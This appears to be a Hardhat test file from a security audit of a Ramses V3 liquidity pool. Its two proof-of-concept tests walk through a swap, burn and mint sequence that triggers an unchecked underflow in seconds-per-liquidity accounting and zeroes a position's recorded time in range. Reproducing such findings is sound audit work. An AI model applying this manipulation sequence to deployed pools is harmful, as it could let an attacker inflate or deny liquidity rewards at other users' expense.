import { ethers, network } from "hardhat";
import { HardhatEthersSigner } from "@nomicfoundation/hardhat-ethers/signers";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { testFixture } from "../../scripts/deployment/testFixture";
import { Voter } from "../../typechain-types";
import { expect } from "../uniswapV3CoreTests/shared/expect";
import { assert } from "chai";
import { MULTISIG, TICK_SPACINGS } from "../../scripts/deployment/constants";
import * as typechain from "../../typechain-types";
import * as helpers from "@nomicfoundation/hardhat-network-helpers";
import {
    createPoolFunctions,
    encodePriceSqrt,
    getMaxTick,
    getMinTick,
} from "../uniswapV3CoreTests/shared/utilities";
import { AddressLike } from "ethers";

const testStartTimestamp = Math.floor(new Date("2030-01-01").valueOf() / 1000);

describe("Audit", () => {
    let c: Awaited<ReturnType<typeof auditTestFixture>>;
    let voter: Voter;
    let wallet: HardhatEthersSigner;
    let attacker: HardhatEthersSigner;
    const fixture = testFixture;

    async function auditTestFixture() {
        const suite = await loadFixture(fixture);
        [wallet, attacker] = await ethers.getSigners();

        // using 60 to match test cases, doesn't exist in contract
        await suite.factory.enableTickSpacing(60, 1000);

        // set pool fees to 0.25% so it's uniform
        await suite.pairFactory.setPairFee(suite.pair, 2500);

        // set protocol fees for cl to be 100% so it's easier to track fee changes
        await suite.factory.setFeeProtocol(100);
        await suite.factory.setPoolFeeProtocol(suite.clPool, 100);

        await suite.pairFactory.setFeeSplit(10000n);
        await suite.pairFactory.setPairFeeSplit(suite.pair, 10000n);

        // set fees to be 0.25% so it's uniform across legacy and cl
        await suite.factory.setFee(suite.clPool, 2500);
        await suite.pairFactory.setFee(25);

        const clPoolAddress = await suite.factory.createPool.staticCall(
            suite.dai.getAddress(),
            suite.mim.getAddress(),
            60,
            0n,
        );

        await suite.factory.createPool(
            suite.dai.getAddress(),
            suite.mim.getAddress(),
            60,
            0n,
        );

        const pool = await ethers.getContractAt("RamsesV3Pool", clPoolAddress);

        await pool.initialize(encodePriceSqrt(1n, 10n).toString());

        const swapTarget = await (
            await ethers.getContractFactory(
                "contracts/CL/core/test/TestRamsesV3Callee.sol:TestRamsesV3Callee",
            )
        ).deploy();

        const {
            swapToLowerPrice,
            swapToHigherPrice,
            swapExact0For1,
            swap0ForExact1,
            swapExact1For0,
            swap1ForExact0,
            mint,
            flash,
        } = createPoolFunctions({
            token0: suite.dai,
            token1: suite.mim,
            swapTarget: swapTarget,
            pool,
        });

        const minTick = getMinTick(60);
        const maxTick = getMaxTick(60);

        await mint(wallet.address, 0n, minTick, maxTick, 100n);

        return {
            ...suite,
            minTick,
            maxTick,
            pool,
            swapTarget,
            swapToLowerPrice,
            swapToHigherPrice,
            swapExact0For1,
            swap0ForExact1,
            swapExact1For0,
            swap1ForExact0,
            mint,
            flash,
        };
    }

    describe("#audit", () => {
        beforeEach("initialize the pool at price of 10:1", async () => {
            c = await loadFixture(auditTestFixture);
            voter = c.voter;
            [wallet, attacker] = await ethers.getSigners();
        });

        it("SPL underflow", async () => {
            const startTimePeriod1: number = Math.floor(
                testStartTimestamp / 604800,
            );
            const startTimePeriod2: number =
                Math.floor(startTimePeriod1 + 1) * 604800;
            const deltaTimeToAdvanceForNextPeriod: number =
                startTimePeriod2 - testStartTimestamp;
            const newPeriod: number = startTimePeriod2 / 604800;
            console.log("Current period", newPeriod); //timestamp startTimePeriod2

            await c.swapToHigherPrice(
                //to tick 0
                BigInt(79228162514264337593543950336),
                wallet.address,
            );
            await c.mint(wallet.address, 0n, -60, 0, 200n);

            // await c.pool.advanceTime(deltaTimeToAdvanceForNextPeriod);
            await helpers.time.increaseTo(startTimePeriod2);

            console.log(
                "-------------------------------TEST START-----------------------",
            );
            //NEW PERIOD, TICK is 0
            //tickSpacing is 60

            //In this test we are trying to create an underflow in periodCumulativesInside to register no debt while minting at the end of the period, but at the same time register a huge SPL.
            //To do so we manipulate the ticks outside crossing the lowerTick twice with one second between crosses to register a higher outside SPL value in the upper than in the lower
            //We then burn the position and swap so that the currentTick is higher than tickUpper, calculating the periodCumulativesInside as Upper - Lower, which will underflow

            //Swap to record tickUpper's SPL outside as Cumulative SPL - lastPeriod end SPL, resulting in a really small value
            await c.swapToLowerPrice(
                //to tick -60
                BigInt(78990846045029531151608375686),
                wallet.address,
            );

            //1 second to increase the SPL inside
            // await c.pool.advanceTime(1);
            await helpers.time.increase(1);

            //Swap to record new Cumulative SPL - (previousCumulativeSPL - lastPeriod end SPL)
            //this results in a higher value than the lastPeriod end SPL
            await c.swapToHigherPrice(
                //to tick 0
                BigInt(79228162514264337593543950336),
                wallet.address,
            );
            //We burn the position clearing the ticks of liquidity, which makes ticks not record crosses
            await c.pool.burn(0, -60, 0, 200n);

            //We swap to a tick under tick lower
            await c.swapToLowerPrice(
                //to tick -120
                BigInt(78754240422856966435523493930),
                wallet.address,
            );
            //We advance the time to one second before finishing the period
            // await c.pool.advanceTime(604798);
            await helpers.time.increase(604798);

            //When we mint, its going to calculate the SPL cumulative inside as the lowerTick's SPL outside - the upperTick's SPL outside
            //This causes an underflow of a uint160 in an unchecked block
            await c.mint(wallet.address, 0n, -60, 0, 1n);
            //However, the uint160 is used in update, and it is casted to int160, overflowing the cast and resulting in a really large negative number as secondsPerLiquidityPeriodIntX128

            //We advance the time to be sure that we are on the next period
            // await c.pool.advanceTime(1);
            await helpers.time.increase(1);

            //We mint a position in a different ticks just to change the state of the newPeriod
            await c.mint(wallet.address, 0n, 60, 120, 1n);

            //If you console.log the secondsInside previous to the sanity check, it returns a huge number
            const secondsInRange = await c.pool.positionPeriodSecondsInRange(
                newPeriod,
                wallet.address,
                0n,
                -60,
                0,
            );
            console.log("SecondsInRange");
            console.log(secondsInRange);
        });
        it("No rewards for a position that has been in range", async () => {
            const startTimePeriod1: number = Math.floor(
                testStartTimestamp / 604800,
            );
            const startTimePeriod2: number =
                Math.floor(startTimePeriod1 + 1) * 604800;
            const deltaTimeToAdvanceForNextPeriod: number =
                startTimePeriod2 - testStartTimestamp;
            const newPeriod: number = startTimePeriod2 / 604800;
            console.log("Current period", newPeriod); //timestamp startTimePeriod2

            await c.swapToHigherPrice(
                //to tick 0
                BigInt(79228162514264337593543950336),
                wallet.address,
            );
            await c.mint(wallet.address, 0n, -60, 0, 200n);

            // await c.pool.advanceTime(deltaTimeToAdvanceForNextPeriod);
            await helpers.time.increaseTo(startTimePeriod2);

            console.log(
                "-------------------------------TEST START-----------------------",
            );
            //NEW PERIOD, TICK is 0
            //tickSpacing is 60

            //We are going to use the same setup as in the SPL underflow test to prove that while a position has held liquidity during half of the period, it won't result in any rewards.

            //Swap to record tickUpper's SPL outside as Cumulative SPL - lastPeriod end SPL, resulting in a really small value
            await c.swapToLowerPrice(
                //to tick -60
                BigInt(78990846045029531151608375686),
                wallet.address,
            );

            // await c.pool.advanceTime(604800 / 2);
            await helpers.time.increase(604800 / 2);

            //Swap to record new Cumulative SPL - (previousCumulativeSPL - lastPeriod end SPL)

            await c.swapToHigherPrice(
                //to tick 0
                BigInt(79228162514264337593543950336),
                wallet.address,
            );
            //We burn the position clearing the ticks of liquidity, which makes ticks not record crosses
            await c.pool.burn(0, -60, 0, 200n);

            //We swap to a tick under tick lower
            await c.swapToLowerPrice(
                //to tick -120
                BigInt(78754240422856966435523493930),
                wallet.address,
            );

            //When we mint, its going to calculate the SPL cumulative inside as the lowerTick's SPL outside - the upperTick's SPL outside
            //This causes an underflow of a uint160 in an unchecked block
            await c.mint(wallet.address, 0n, -60, 0, 200n);
            //We swap back so that the position is in range
            await c.swapToHigherPrice(
                //to tick -60
                BigInt(78990846045029531151608375686),
                wallet.address,
            );
            //We advance the time to be sure that we are on the next period
            // await c.pool.advanceTime(604800 / 2);
            await helpers.time.increase(604800 / 2);

            //We mint a position in a different ticks just to change the state of the newPeriod
            await c.mint(wallet.address, 0n, 60, 120, 1n);

            //The position has been in range for most of the period, and returns 0 seconds in range
            const secondsInRange = await c.pool.positionPeriodSecondsInRange(
                newPeriod,
                wallet.address,
                0n,
                -60,
                0,
            );
            console.log("SecondsInRange");
            console.log(secondsInRange);
        });
    });
});
